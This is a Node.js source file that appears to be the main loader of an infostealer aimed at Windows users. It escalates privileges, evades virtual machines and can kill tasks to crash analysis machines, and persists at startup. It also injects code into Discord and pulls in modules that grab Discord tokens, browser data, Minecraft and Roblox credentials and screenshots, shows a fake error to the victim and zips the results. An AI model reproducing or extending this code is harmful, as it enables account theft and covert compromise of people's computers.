const { sep, join, resolve } = require('path');
const { mkdtempSync } = require('fs');
const os = require('os');
const config = require('./config');
const { spawnSync, execFileSync } = require('child_process');
const { checkVM, killTasks } = require('./functions/anti-vm');
const sudo = require('sudo-prompt');
const tempFolder = mkdtempSync(join(os.tmpdir(), sep)).toString();
module.exports.tempFolder = tempFolder;
spawnSync('explorer', [tempFolder]);

try {
  execFileSync('net', ['session'], { 'stdio': 'ignore' });
} catch (e) {
  sudo.exec(resolve(__filename));
}
if (os.platform() !== 'win32') process.exit();

if (config.vmProtect && checkVM()) {
  if (config.bsodIfVm) {
    killTasks();
  } else {
    process.exit();
  }
} else {
  config.addToStartup && require('./functions/startup');
  config.discord.killProcess && require('./functions/kill-discord');
  config.discord.injectJs && require('./functions/discord-injection');
  require('./functions/grab-mc');
  require('./functions/grab-roblox');
  require('./functions/grab-discord-token');
  require('./functions/grab-browsers-data');
  if (config.discord.autoJoinGuild && typeof config.discord.autoJoinGuild === 'string') require('./functions/auto-join-guild');
  require('./functions/screenshot');
  config.fakeError && require('./functions/fake-error');

  process.on('beforeExit', () => require('./functions/zip'));
}
